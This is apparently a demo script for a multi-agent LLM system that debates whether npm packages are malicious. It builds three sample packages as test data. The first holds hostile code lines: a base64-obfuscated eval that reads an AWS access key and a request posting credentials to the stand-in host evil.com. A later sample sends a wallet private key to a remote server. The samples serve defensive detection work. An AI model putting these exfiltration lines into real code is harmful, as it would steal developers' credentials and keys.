"""
Sophisticated Debate System Demo
=================================
Demonstrates the enhanced 4-phase debate orchestration with overseer.
"""

import asyncio
import json
from src.debate_orchestrator import get_debate_orchestrator
from src.models import PackageData


async def demo_simple_case():
    """Demo 1: Simple malicious package - should reach consensus quickly."""
    print("\n" + "=" * 70)
    print("DEMO 1: Obviously Malicious Package")
    print("=" * 70)
    
    package = PackageData(
        package_name="evil-backdoor",
        version="1.0.0",
        registry="npm",
        description="Utility library for data processing",
        author="hacker123",
        downloads_last_month=50,
        package_age_days=2,
        code_segments=[
            {
                "code": "eval(Buffer.from('cHJvY2Vzcy5lbnYuQVdTX0FDQ0VTU19LRVk=', 'base64').toString())",
                "location": "index.js:10",
                "reason": "eval_with_base64_decode"
            },
            {
                "code": "require('http').request('http://evil.com/exfil', {method: 'POST', body: credentials})",
                "location": "index.js:45",
                "reason": "network_exfiltration"
            }
        ],
        static_analysis={
            "high_entropy_count": 5,
            "dangerous_apis": ["eval", "exec", "http.request"],
            "obfuscation_score": 92
        },
        behavioral_analysis={
            "network_calls": ["http://evil.com/exfil"],
            "file_operations": ["/home/user/.aws/credentials"],
            "process_spawns": []
        }
    )
    
    orchestrator = get_debate_orchestrator()
    result = await orchestrator.run_debate(package)
    
    print_debate_summary(result)


async def demo_ambiguous_case():
    """Demo 2: Ambiguous case - should trigger debate and maybe intervention."""
    print("\n" + "=" * 70)
    print("DEMO 2: Ambiguous Package - Requires Deep Analysis")
    print("=" * 70)
    
    package = PackageData(
        package_name="data-processor-2024",
        version="2.1.0",
        registry="npm",
        description="Advanced data transformation utilities",
        author="DataTeam Inc",
        downloads_last_month=15000,
        package_age_days=180,
        code_segments=[
            {
                "code": "const config = require('./config'); fetch(config.analyticsEndpoint, {method: 'POST', body: JSON.stringify(stats)})",
                "location": "lib/analytics.js:25",
                "reason": "network_call_to_external_server"
            },
            {
                "code": "fs.writeFileSync(path.join(os.homedir(), '.app-cache'), data)",
                "location": "lib/cache.js:10",
                "reason": "writes_to_home_directory"
            }
        ],
        static_analysis={
            "high_entropy_count": 1,
            "dangerous_apis": ["fs.writeFileSync"],
            "obfuscation_score": 15
        },
        behavioral_analysis={
            "network_calls": ["https://analytics.dataprocessor.com/stats"],
            "file_operations": ["/home/user/.app-cache"],
            "process_spawns": []
        },
        dependency_analysis={
            "total_dependencies": 8,
            "suspicious_dependencies": []
        }
    )
    
    orchestrator = get_debate_orchestrator()
    result = await orchestrator.run_debate(package)
    
    print_debate_summary(result)


async def demo_controversial_case():
    """Demo 3: Controversial case - agents likely disagree, may need tiebreaker."""
    print("\n" + "=" * 70)
    print("DEMO 3: Controversial Package - May Trigger Tiebreaker")
    print("=" * 70)
    
    package = PackageData(
        package_name="crypto-wallet-helper",
        version="1.5.3",
        registry="npm",
        description="Cryptocurrency wallet management utilities",
        author="CryptoDevs",
        downloads_last_month=8000,
        package_age_days=365,
        code_segments=[
            {
                "code": "const privateKey = process.env.WALLET_PRIVATE_KEY; if (privateKey) { signTransaction(privateKey, tx); }",
                "location": "lib/wallet.js:50",
                "reason": "accesses_private_key_env_var"
            },
            {
                "code": "https.post('https://wallet-service.crypto.com/sign', {tx, key: privateKey})",
                "location": "lib/wallet.js:75",
                "reason": "sends_private_key_to_server"
            }
        ],
        static_analysis={
            "high_entropy_count": 2,
            "dangerous_apis": ["process.env", "https.post"],
            "obfuscation_score": 35
        },
        behavioral_analysis={
            "network_calls": ["https://wallet-service.crypto.com/sign"],
            "file_operations": [],
            "process_spawns": []
        },
        readme="This library simplifies cryptocurrency wallet management by providing server-side signing capabilities. For security, signing happens on our secure servers."
    )
    
    orchestrator = get_debate_orchestrator()
    result = await orchestrator.run_debate(package)
    
    print_debate_summary(result)


def print_debate_summary(result):
    """Print formatted debate summary."""
    print(f"\n{'═' * 70}")
    print(f"DEBATE RESULT")
    print(f"{'═' * 70}")
    
    print(f"\n📦 Package: {result.package_name}")
    print(f"⚖️  Final Verdict: {result.final_verdict.upper()}")
    print(f"🎯 Risk Score: {result.final_risk_score:.1f}/100")
    print(f"💪 Confidence: {result.final_confidence:.1f}%")
    print(f"🤝 Consensus Type: {result.consensus_type}")
    print(f"🔄 Rounds: {result.rounds_to_consensus}")
    print(f"⏱️  Duration: {result.total_duration_seconds:.1f}s")
    print(f"🎭 Overseer Voted: {'Yes' if result.overseer_voted else 'No'}")
    print(f"⚠️  Interventions: {result.total_interventions}")
    
    print(f"\n📊 Final Votes:")
    for agent, verdict in result.final_votes.items():
        icon = "🤖" if agent != "overseer" else "👁️"
        print(f"   {icon} {agent:25s}: {verdict}")
    
    print(f"\n🔑 Key Arguments:")
    for i, arg in enumerate(result.key_arguments[:5], 1):
        print(f"   {i}. {arg[:70]}...")
    
    print(f"\n📈 Debate Quality: {result.debate_quality_score:.1f}/100")
    print(f"🧠 Reasoning Depth: {result.reasoning_depth}")
    
    # Show round-by-round breakdown
    print(f"\n{'─' * 70}")
    print(f"ROUND-BY-ROUND BREAKDOWN")
    print(f"{'─' * 70}")
    
    for round in result.debate_history:
        print(f"\n🔵 Round {round.round_number}:")
        
        if round.presentations:
            print(f"   Presentations:")
            for pres in round.presentations:
                print(f"      • {pres.agent_name}: {pres.position} (risk={pres.risk_score:.0f})")
        
        if round.interventions:
            print(f"   ⚠️  Overseer Interventions: {len(round.interventions)}")
            for inter in round.interventions:
                print(f"      → {inter.target_agent}: {inter.issue_type} ({inter.severity})")
        
        if round.votes:
            vote_summary = ", ".join([f"{v.agent_name}:{v.verdict}" for v in round.votes])
            print(f"   Votes: {vote_summary}")
        
        if round.consensus_reached:
            print(f"   ✅ Consensus reached: {round.consensus_verdict}")
    
    print(f"\n{'═' * 70}\n")


async def demo_all():
    """Run all demos."""
    print("\n" + "🎭" * 35)
    print("SOPHISTICATED LLM COUNCIL DEBATE SYSTEM")
    print("4-Phase Deliberation with Overseer Monitoring")
    print("🎭" * 35)
    
    try:
        await demo_simple_case()
        
        input("\nPress Enter to continue to next demo...")
        await demo_ambiguous_case()
        
        input("\nPress Enter to continue to final demo...")
        await demo_controversial_case()
        
    except KeyboardInterrupt:
        print("\n\nDemo interrupted by user.")
    except Exception as e:
        print(f"\n❌ Demo failed: {e}")
        import traceback
        traceback.print_exc()
    
    print("\n" + "🎭" * 35)
    print("ALL DEMOS COMPLETED")
    print("🎭" * 35 + "\n")


if __name__ == "__main__":
    asyncio.run(demo_all())
